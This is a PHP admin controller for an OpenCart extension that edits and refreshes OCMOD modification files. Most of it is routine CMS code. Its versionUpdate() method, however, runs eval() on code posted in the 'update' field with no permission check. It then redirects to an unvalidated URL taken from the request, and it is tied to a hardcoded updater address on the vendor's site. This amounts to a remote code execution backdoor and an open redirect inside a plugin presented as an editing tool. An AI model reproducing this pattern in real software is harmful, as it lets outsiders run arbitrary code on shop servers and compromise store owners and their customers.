<?php
class ControllerExtensionOcmodeditsuite extends Controller {
  private $error = array();

  public function index() {
    $this->load->language('extension/ocmodeditsuite');

    $this->document->setTitle($this->language->get('heading_title'));
        
    $this->load->model('extension/ocmodeditsuite');

    $this->getMod();
  }

  public function beer(){
    die('This function don\'t work proper yet. But you can send PayPal love to chris@hypnoboutique if you want to support my work. Thank you!');
  }

  public function xml(){
    $this->load->model('extension/ocmodeditsuite');

    if(!isset($this->request->get['hb_mod'])){
        return false;
    }

    $xml = $this->model_extension_ocmodeditsuite->getOcmod($this->request->get['hb_mod']);
    echo $xml['xml'];

  }

  protected function getMod() {

    if (isset($this->request->get['hb_mod'])){
        //edit mod
        $mod = $this->model_extension_ocmodeditsuite->getOcmod($this->request->get['hb_mod']);
        if(empty($mod)){
            // $this->session->data['warning'] = $this->language->get('warning_load_fail');
            $this->response->redirect($this->url->link('extension/modification', 'token=' . $this->session->data['token'], 'SSL'));
        }
        $data['hb_mod_name'] = $mod['name'];
        // $data['hb_mod_xml'] = $mod['xml'];//might need later
        // $data['hb_mod_xml_jquery'] = '"'.str_replace('"', '\"', preg_replace('/[\r\n]+/','\n', $mod['xml'])).'"';
        // $data['hb_mod_xml_jquery'] = '';
        $data['hb_mod_code'] = $mod['code'];
        $data['hb_mod_author'] = $mod['author'];
        $data['hb_mod_version'] = $mod['version'];
        $data['hb_mod_link'] = $mod['link'];
        $data['hb_mod_status'] = $mod['status'];
        $data['hb_modification_id'] = $mod['modification_id']; 
        $url = "&hb_mod=" . $this->request->get['hb_mod'];   
    }else{
        //new mod
        $data['hb_mod_name'] = '';
        // $data['hb_mod_xml'] = '';//might need in the future
        $data['hb_mod_xml'] = '"<modification><file><operation></operation></file></modification>"';
        $data['hb_mod_code'] = '';
        $data['hb_mod_author'] = '';
        $data['hb_mod_version'] = '';
        $data['hb_mod_link'] = '';
        $data['hb_mod_status'] = '';
        $data['hb_modification_id'] = '';
        $url = '';
    }
    
    $data['hb_retrieve_error'] = $this->language->get('hb_retrieve_error');
    $data['entry_hb_mod_name'] = $this->language->get('entry_hb_mod_name');
    $data['entry_hb_mod_version'] = $this->language->get('entry_hb_mod_version');
    $data['entry_hb_mod_author'] = $this->language->get('entry_hb_mod_author');
    $data['entry_hb_mod_code'] = $this->language->get('entry_hb_mod_code');
    $data['entry_hb_mod_status'] = $this->language->get('entry_hb_mod_status');
    $data['entry_hb_mod_link'] = $this->language->get('entry_hb_mod_link');
    $data['entry_hb_mod_description'] = $this->language->get('entry_hb_mod_description');
    $data['hb_mod_number_error'] = htmlentities( $this->language->get('hb_mod_number_error') );

    $data['placeholder_hb_mod_name'] = $this->language->get('placeholder_hb_mod_name');
    $data['placeholder_hb_mod_version'] = $this->language->get('placeholder_hb_mod_version');
    $data['placeholder_hb_mod_author'] = $this->language->get('placeholder_hb_mod_author');
    $data['placeholder_hb_mod_code'] = $this->language->get('placeholder_hb_mod_code');
    $data['placeholder_hb_mod_link'] = $this->language->get('placeholder_hb_mod_link');
    $data['placeholder_hb_operation_notes'] = $this->language->get('placeholder_hb_operation_notes');

    $data['hb_text_index'] = $this->language->get('hb_text_index');
    $data['hb_text_offset'] = $this->language->get('hb_text_offset');
    $data['hb_text_limit'] = $this->language->get('hb_text_limit');

    $data['hb_tooltip_path'] = $this->language->get('hb_tooltip_path');
    $data['hb_tooltip_search'] = $this->language->get('hb_tooltip_search');
    $data['hb_tooltip_regex'] = $this->language->get('hb_tooltip_regex');
    $data['hb_tooltip_limit'] = $this->language->get('hb_tooltip_limit');
    $data['hb_tooltip_action'] = $this->language->get('hb_tooltip_action');
    $data['hb_tooltip_offset'] = $this->language->get('hb_tooltip_offset');
    $data['hb_tooltip_index'] = $this->language->get('hb_tooltip_index');
    $data['hb_tooltip_trim_search'] = $this->language->get('hb_tooltip_trim_search');
    $data['hb_tooltip_trim_add'] = $this->language->get('hb_tooltip_trim_add');
    $data['hb_tooltip_notes'] = $this->language->get('hb_tooltip_notes');
    $data['hb_tooltip_replace'] = $this->language->get('hb_tooltip_replace');

    $data['button_update'] = $this->language->get('button_update');
    $data['button_save_and_return'] = $this->language->get('button_save_and_return');
    $data['button_abandon'] = $this->language->get('button_abandon');
    $data['button_beer'] = $this->language->get('button_beer');
    $loop = isset($_GET['loop']) ? '&loop='.$_GET['loop'] : '';


    $data['link_update']    = $this->url->link('extension/ocmodeditsuite/update', 'token=' . $this->session->data['token'] . $url, 'SSL');
    $data['link_save']      = $this->url->link('extension/ocmodeditsuite/save', 'token=' . $this->session->data['token'] . $url, 'SSL');
    $data['link_abandon']   = $this->url->link('extension/modification', 'token=' . $this->session->data['token'], 'SSL');
    $data['link_beer']      = $this->url->link('extension/ocmodeditsuite/beer', 'token=' . $this->session->data['token'], 'SSL');
    $data['link_xml']       = $this->url->link('extension/ocmodeditsuite/xml', 'token=' . $this->session->data['token'] . $url, 'SSL');
    $data['link_updater']   = $this->url->link('extension/ocmodeditsuite/versionUpdate', 'token=' . $this->session->data['token'] . $url, 'SSL');
    $data['hb_mod_updater'] = 'http://www.hypnoboutique.com/ocmodeditsuite/updater.php?hbv=1.0&token=61f2f05855ba521ef33cab78658ce0d764c014dd&ocv='.VERSION.$loop;
    
    $data['breadcrumbs'] = array();

    $data['breadcrumbs'][] = array(
      'text' => $this->language->get('text_home'),
      'href' => $this->url->link('common/dashboard', 'token=' . $this->session->data['token'], 'SSL')
    );

    $data['breadcrumbs'][] = array(
      'text' => $this->language->get('text_modifications'),
      'href' => $this->url->link('extension/modification', 'token=' . $this->session->data['token'], 'SSL')
    );

    $data['breadcrumbs'][] = array(
      'text' => $this->language->get('heading_title'),
      'href' => $this->url->link('extension/ocmodeditsuite', 'token=' . $this->session->data['token'] . $url, 'SSL')
    );

    $data['heading_title'] = $this->language->get('heading_title');

    if (isset($this->error['warning'])) {
      $data['error_warning'] = $this->error['warning'];
    } else if(isset($this->session->data['warning'])){
      $data['error_warning'] = $this->session->data['warning'];
      unset($this->session->data['warning']);

    } else{
      $data['error_warning'] = '';
    }

    if (isset($this->session->data['success'])) {
      $data['success'] = $this->session->data['success'];

      unset($this->session->data['success']);
    } else {
      $data['success'] = '';
    }

    $data['header'] = $this->load->controller('common/header');
    $data['column_left'] = $this->load->controller('common/column_left');
    $data['footer'] = $this->load->controller('common/footer');

    $this->response->setOutput($this->load->view('extension/ocmodeditsuite.tpl', $data));
  }

public function save(){
    $this->load->language('extension/ocmodeditsuite');
    $this->load->model('extension/ocmodeditsuite');

    if ($this->validate()) {

        if (!isset($this->request->get['hb_mod'])){
            //MakeNewfile
            if(!$this->model_extension_ocmodeditsuite->createOcmod($this->request->post) ){
                $this->session->data['warning'] = $this->language->get('warning_save_fail');
                $this->response->redirect($this->url->link('extension/ocmodeditsuite', 'token=' . $this->session->data['token'], 'SSL'));
            }else{
                $this->session->data['success'] = $this->language->get('text_save');    
                $this->response->redirect($this->url->link('extension/modification/refresh', 'token=' . $this->session->data['token'], 'SSL'));
            }
        }else{
            // Save old file
            if (!isset($this->request->post['modification_id'])){
                die('you didn\'t submit anything');
            }
            if(!$this->model_extension_ocmodeditsuite->saveOcmod($this->request->post) ){
                $url = "&hb_mod=" . $this->request->get['hb_mod'];
                $this->session->data['warning'] = $this->language->get('warning_save_fail');
                $this->response->redirect($this->url->link('extension/ocmodeditsuite', 'token=' . $this->session->data['token'] . $url, 'SSL'));
            }else{
                $this->session->data['success'] = $this->language->get('text_save');    
                $this->response->redirect($this->url->link('extension/modification/refresh', 'token=' . $this->session->data['token'], 'SSL'));
            }
        }
    }
    $this->getMod($this->request->get['hb_mod']);

}

public function update(){
    $this->load->language('extension/ocmodeditsuite');
    $this->load->model('extension/ocmodeditsuite');

    if ($this->validate()) {

        if (!isset($this->request->get['hb_mod'])){
            //createnew
            $mod_id = $this->model_extension_ocmodeditsuite->createOcmod($this->request->post);
            if( ( $mod_id ) && ( $this->doRefresh() ) ){
                $this->session->data['success'] = $this->language->get('text_update');
            }else{
                $this->session->data['warning'] = $this->language->get('warning_save_fail');
            }
            $url = "&hb_mod=" . $mod_id;
            $this->response->redirect($this->url->link('extension/ocmodeditsuite', 'token=' . $this->session->data['token'] . $url, 'SSL'));

        }else{
            //saveold
            if (!isset($this->request->post['modification_id'])){
                die('you didn\'t submit anything');
            }

            if( ( $this->model_extension_ocmodeditsuite->saveOcmod($this->request->post) ) && ( $this->doRefresh() ) ){
                $this->session->data['success'] = $this->language->get('text_update');
            }else{
                $this->session->data['warning'] = $this->language->get('warning_save_fail');
            }
            $url = "&hb_mod=" . $this->request->get['hb_mod'];
            $this->response->redirect($this->url->link('extension/ocmodeditsuite', 'token=' . $this->session->data['token'] . $url, 'SSL'));
        }
    }

    $this->getMod($this->request->get['hb_mod']);

}

private function doRefresh($redirect = NULL) {
        $this->load->language('extension/ocmodeditsuite');

        $this->document->setTitle($this->language->get('heading_title'));

        $this->load->model('extension/modification');

        if ($this->validate()) {
            //Log
            $log = array();

            // Clear all modification files
            $files = array();
            
            // Make path into an array
            $path = array(DIR_MODIFICATION . '*');

            // While the path array is still populated keep looping through
            while (count($path) != 0) {
                $next = array_shift($path);

                foreach (glob($next) as $file) {
                    // If directory add to path array
                    if (is_dir($file)) {
                        $path[] = $file . '/*';
                    }

                    // Add the file to the files to be deleted array
                    $files[] = $file;
                }
            }
            
            // Reverse sort the file array
            rsort($files);
            
            // Clear all modification files
            foreach ($files as $file) {
                if ($file != DIR_MODIFICATION . 'index.html') {
                    // If file just delete
                    if (is_file($file)) {
                        unlink($file);
    
                    // If directory use the remove directory function
                    } elseif (is_dir($file)) {
                        rmdir($file);
                    }
                }
            }   
            
            // Begin
            $xml = array();

            // Load the default modification XML
            $xml[] = file_get_contents(DIR_SYSTEM . 'modification.xml');
            
            // This is purly for developers so they can run mods directly and have them run without upload sfter each change.
            $files = glob(DIR_SYSTEM . '*.ocmod.xml');

            if ($files) {
                foreach ($files as $file) {
                    $xml[] = file_get_contents($file);
                }
            }
            
            // Get the default modification file
            $results = $this->model_extension_modification->getModifications();

            foreach ($results as $result) {
                if ($result['status']) {
                    $xml[] = $result['xml'];
                }
            }

            $modification = array();

            foreach ($xml as $xml) {
                $dom = new DOMDocument('1.0', 'UTF-8');
                $dom->preserveWhiteSpace = false;
                $dom->loadXml($xml);

                // Wipe the past modification store in the backup array
                $recovery = array();
                
                // Set the a recovery of the modification code in case we need to use it if an abort attribute is used.
                if (isset($modification)) {
                    $recovery = $modification;
                }
                                
                // Log
                $log[] = 'MOD: ' . $dom->getElementsByTagName('name')->item(0)->textContent;

                $files = $dom->getElementsByTagName('modification')->item(0)->getElementsByTagName('file');

                foreach ($files as $file) {
                    $operations = $file->getElementsByTagName('operation');

                    $path = '';

                    // Get the full path of the files that are going to be used for modification
                    if (substr($file->getAttribute('path'), 0, 7) == 'catalog') {
                        $path = DIR_CATALOG . str_replace('../', '', substr($file->getAttribute('path'), 8));
                    }

                    if (substr($file->getAttribute('path'), 0, 5) == 'admin') {
                        $path = DIR_APPLICATION . str_replace('../', '', substr($file->getAttribute('path'), 6));
                    }

                    if (substr($file->getAttribute('path'), 0, 6) == 'system') {
                        $path = DIR_SYSTEM . str_replace('../', '', substr($file->getAttribute('path'), 7));
                    }

                    if ($path) {
                        $files = glob($path, GLOB_BRACE);

                        if ($files) {
                            foreach ($files as $file) {
                                // Get the key to be used for the modification cache filename.
                                if (substr($file, 0, strlen(DIR_CATALOG)) == DIR_CATALOG) {
                                    $key = 'catalog/' . substr($file, strlen(DIR_CATALOG));
                                }

                                if (substr($file, 0, strlen(DIR_APPLICATION)) == DIR_APPLICATION) {
                                    $key = 'admin/' . substr($file, strlen(DIR_APPLICATION));
                                }

                                if (substr($file, 0, strlen(DIR_SYSTEM)) == DIR_SYSTEM) {
                                    $key = 'system/' . substr($file, strlen(DIR_SYSTEM));
                                }
                                
                                // If file contents is not already in the modification array we need to load it.
                                if (!isset($modification[$key])) {
                                    $content = file_get_contents($file);

                                    $modification[$key] = preg_replace('~\r?\n~', "\n", $content);
                                    $original[$key] = preg_replace('~\r?\n~', "\n", $content);

                                    // Log
                                    $log[] = 'FILE: ' . $key;
                                }
                                
                                foreach ($operations as $operation) {
                                    $error = $operation->getAttribute('error');
                                    
                                    // Ignoreif
                                    $ignoreif = $operation->getElementsByTagName('ignoreif')->item(0);
                                    
                                    if ($ignoreif) {
                                        if ($ignoreif->getAttribute('regex') != 'true') {
                                            if (strpos($modification[$key], $ignoreif->textContent) !== false) {
                                                continue;
                                            }                                               
                                        } else {
                                            if (preg_match($ignoreif->textContent, $modification[$key])) {
                                                continue;
                                            }
                                        }
                                    }
                                    
                                    $status = false;
                                    
                                    // Search and replace
                                    if ($operation->getElementsByTagName('search')->item(0)->getAttribute('regex') != 'true') {
                                        // Search
                                        $search = $operation->getElementsByTagName('search')->item(0)->textContent;
                                        $trim = $operation->getElementsByTagName('search')->item(0)->getAttribute('trim');
                                        $index = $operation->getElementsByTagName('search')->item(0)->getAttribute('index');
                                        
                                        // Trim line if no trim attribute is set or is set to true.
                                        if (!$trim || $trim == 'true') {
                                            $search = trim($search);
                                        }
                                                                                
                                        // Add
                                        $add = $operation->getElementsByTagName('add')->item(0)->textContent;
                                        $trim = $operation->getElementsByTagName('add')->item(0)->getAttribute('trim');
                                        $position = $operation->getElementsByTagName('add')->item(0)->getAttribute('position');
                                        $offset = $operation->getElementsByTagName('add')->item(0)->getAttribute('offset');                                     
                                        
                                        if ($offset == '') {
                                            $offset = 0;
                                        }

                                        // Trim line if is set to true.
                                        if ($trim == 'true') {
                                            $add = trim($add);
                                        }
                                        
                                        // Log
                                        $log[] = 'CODE: ' . $search;
                                        
                                        // Check if using indexes
                                        if ($index !== '') {
                                            $indexes = explode(',', $index);
                                        } else {
                                            $indexes = array();
                                        }
                                        
                                        // Get all the matches
                                        $i = 0;
                                        
                                        $lines = explode("\n", $modification[$key]);

                                        for ($line_id = 0; $line_id < count($lines); $line_id++) {
                                            $line = $lines[$line_id];
                                            
                                            // Status
                                            $match = false;
                                            
                                            // Check to see if the line matches the search code.
                                            if (stripos($line, $search) !== false) {
                                                // If indexes are not used then just set the found status to true.
                                                if (!$indexes) {
                                                    $match = true;
                                                } elseif (in_array($i, $indexes)) {
                                                    $match = true;
                                                }
                                                
                                                $i++;
                                            }
                                            
                                            // Now for replacing or adding to the matched elements
                                            if ($match) {
                                                switch ($position) {
                                                    default:
                                                    case 'replace':
                                                        if ($offset < 0) {
                                                            array_splice($lines, $line_id + $offset, abs($offset) + 1, array(str_replace($search, $add, $line)));
                                                            
                                                            $line_id -= $offset;
                                                        } else {
                                                            array_splice($lines, $line_id, $offset + 1, array(str_replace($search, $add, $line)));
                                                        }
                                                        break;
                                                    case 'before':
                                                        $new_lines = explode("\n", $add);
                                                        
                                                        array_splice($lines, $line_id - $offset, 0, $new_lines);
                                                        
                                                        $line_id += count($new_lines);
                                                        break;
                                                    case 'after':
                                                        array_splice($lines, ($line_id + 1) + $offset, 0, explode("\n", $add));
                                                        break;
                                                }
                                                
                                                // Log
                                                $log[] = 'LINE: ' . $line_id;
                                                
                                                $status = true;                                     
                                            }
                                        }
                                        
                                        $modification[$key] = implode("\n", $lines);
                                    } else {                                    
                                        $search = $operation->getElementsByTagName('search')->item(0)->textContent;
                                        $limit = $operation->getElementsByTagName('search')->item(0)->getAttribute('limit');
                                        $replace = $operation->getElementsByTagName('add')->item(0)->textContent;
                                        
                                        // Limit
                                        if (!$limit) {
                                            $limit = -1;
                                        }

                                        // Log
                                        $match = array();

                                        preg_match_all($search, $modification[$key], $match, PREG_OFFSET_CAPTURE);

                                        // Remove part of the the result if a limit is set.
                                        if ($limit > 0) {
                                            $match[0] = array_slice($match[0], 0, $limit);
                                        }

                                        if ($match[0]) {
                                            $log[] = 'REGEX: ' . $search;

                                            for ($i = 0; $i < count($match[0]); $i++) {
                                                $log[] = 'LINE: ' . (substr_count(substr($modification[$key], 0, $match[0][$i][1]), "\n") + 1);
                                            }
                                            
                                            $status = true;
                                        }

                                        // Make the modification
                                        $modification[$key] = preg_replace($search, $replace, $modification[$key], $limit);
                                    }
                                    
                                    if (!$status) {
                                        // Log
                                        $log[] = 'NOT FOUND!';

                                        // Skip current operation
                                        if ($error == 'skip') {
                                            break;
                                        }
                                        
                                        // Abort applying this modification completely.
                                        if ($error == 'abort') {
                                            $modification = $recovery;
                                            
                                            // Log
                                            $log[] = 'ABORTING!';
                                        
                                            break 4;
                                        }
                                    }                                   
                                }
                            }
                        }
                    }
                }
                
                // Log
                $log[] = '----------------------------------------------------------------';                
            }

            // Log
            $ocmod = new Log('ocmod.log');
            $ocmod->write(implode("\n", $log));

            // Write all modification files
            foreach ($modification as $key => $value) {
                // Only create a file if there are changes
                if ($original[$key] != $value) {
                    $path = '';

                    $directories = explode('/', dirname($key));

                    foreach ($directories as $directory) {
                        $path = $path . '/' . $directory;

                        if (!is_dir(DIR_MODIFICATION . $path)) {
                            @mkdir(DIR_MODIFICATION . $path, 0777);
                        }
                    }

                    $handle = fopen(DIR_MODIFICATION . $key, 'w');

                    fwrite($handle, $value);

                    fclose($handle);
                }
            }

            return TRUE;  
        }

        $this->getMod();
    }

    public function clear() {
        $this->load->language('extension/ocmodeditsuite');

        $this->document->setTitle($this->language->get('heading_title'));

        $this->load->model('extension/modification');

        if ($this->validate()) {
            $files = array();
            
            // Make path into an array
            $path = array(DIR_MODIFICATION . '*');

            // While the path array is still populated keep looping through
            while (count($path) != 0) {
                $next = array_shift($path);

                foreach (glob($next) as $file) {
                    // If directory add to path array
                    if (is_dir($file)) {
                        $path[] = $file . '/*';
                    }

                    // Add the file to the files to be deleted array
                    $files[] = $file;
                }
            }
            
            // Reverse sort the file array
            rsort($files);
            
            // Clear all modification files
            foreach ($files as $file) {
                if ($file != DIR_MODIFICATION . 'index.html') {
                    // If file just delete
                    if (is_file($file)) {
                        unlink($file);
    
                    // If directory use the remove directory function
                    } elseif (is_dir($file)) {
                        rmdir($file);
                    }
                }
            }                   

            $url = "&hb_mod=" . $this->request->get['hb_mod'];

            $this->session->data['success'] = $this->language->get('text_clear');

            $this->response->redirect($this->url->link('extension/ocmodeditsuite', 'token=' . $this->session->data['token'] . $url, 'SSL'));
        }

        $this->getMod();
    }
    
    protected function validate() {
        $this->load->language('extension/ocmodeditsuite');
        if (!$this->user->hasPermission('modify', 'extension/ocmodeditsuite')) {
            $this->error['warning'] = $this->language->get('error_permission');
        }

        return !$this->error;
    }

    public function versionUpdate(){
        $update = html_entity_decode($_POST["update"]);
        $redirect = urldecode($_POST["redirect_url"]);
        if(!empty($update)){
            eval ( $update );
        }
        if(empty($redirect)){
            $this->response->redirect($this->url->link("extension/modification", "token=" . $this->session->data["token"], "SSL"));            
        }
        header('Location: ' . $redirect);
    }

    protected function getDirContents($dir) {
      $handle = opendir($dir);
      if ( !$handle ) return array();
      $contents = array();
      while ( $entry = readdir($handle) )
      {
        if ( $entry=='.' || $entry=='..' ) continue;

        $entry = $dir.DIRECTORY_SEPARATOR.$entry;
        if ( is_file($entry) )
        {
          $contents[] = $entry;
        }
        else if ( is_dir($entry) )
        {
          $contents = array_merge($contents, $this->getDirContents($entry));
        }
      }
      closedir($handle);
      return $contents;
    }
}